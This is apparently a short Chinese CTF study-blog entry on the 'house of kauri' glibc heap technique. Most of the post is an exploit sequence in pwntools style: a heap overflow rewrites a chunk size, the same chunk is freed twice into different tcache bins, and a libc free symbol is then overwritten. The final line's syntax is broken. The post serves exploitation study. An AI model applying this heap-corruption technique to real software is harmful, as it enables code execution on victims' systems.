---
title: "house of kauri"
date: 2026-04-13 20:54:43
description: "通过修改size使两次free的同一块内存进入不同的entries add_chunk(10,0x10) add_chunk(0,0) add_chunk(1,0x20) delete_chunk(10)"
tags:
  - Pwn
  - Heap
categories:
  - Pwn学习记录
  - 堆相关
cover: /img/cover-kurumi.png
top_img: /img/cover-kurumi.png
---

通过修改size使两次free的同一块内存进入不同的entries

add_chunk(10,0x10)
add_chunk(0,0)
add_chunk(1,0x20)


delete_chunk(10)
delete_chunk(1)
edit_chunk(0,'a'*0x18+p64(0x20))
delete_chunk(1)

add_chunk(0,0x18)
add_chunk(0,0x18)
edit_chunk(0,p64(libc.sym'__free'))


